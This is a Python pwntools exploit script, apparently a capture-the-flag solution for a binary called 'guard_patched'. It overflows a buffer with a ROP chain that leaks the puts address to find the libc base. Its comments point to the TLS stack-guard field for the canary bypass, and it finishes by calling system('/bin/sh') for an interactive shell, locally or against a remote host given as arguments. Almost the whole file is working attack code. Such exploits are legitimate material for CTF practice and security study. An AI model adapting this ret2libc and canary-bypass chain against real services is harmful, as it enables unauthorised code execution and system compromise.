#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('guard_patched')
libc = ELF("./libc.so.6")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x0000000000401389
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# typedef struct
#   {
#     void *tcb;        /* Pointer to the TCB.  Not necessarily the
#                  thread descriptor used by libpthread.  */
#     dtv_t *dtv;
#     void *self;       /* Pointer to the thread descriptor.  */
#     int multiple_threads;
#     int gscope_flag;
#     uintptr_t sysinfo;
#     uintptr_t stack_guard; --> stack canary gotten from here
#     uintptr_t pointer_guard;
#     ...
#   } tcbhead_t;

def init():
    global io

    io = start()

def solve():
    offset = 56
    pop_rdi = 0x401256 # pop rdi; ret;
    ret = 0x40101a # ret;
    bss = 0x3fe000 # 0x404b00-0x972 writable bss

    chain = b'A' * offset

    chain += flat([
        pop_rdi,
        exe.got['puts'],
        exe.plt['puts'],
        exe.sym['game'],
        b'B'*2008,
        bss,
        b'A'*24
    ])

    io.sendline('1')
    io.recvuntil('len:')
    io.sendline(str(len(chain)))
    io.sendline(chain)

    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - libc.sym['puts']
    info("libc base: %#x", libc.address)

    offset = 40
    sh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']

    payload = flat({
        offset: [
            b'A'*16,
            pop_rdi,
            sh,
            ret,
            system
        ]
    })
    
    io.sendline(payload)

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

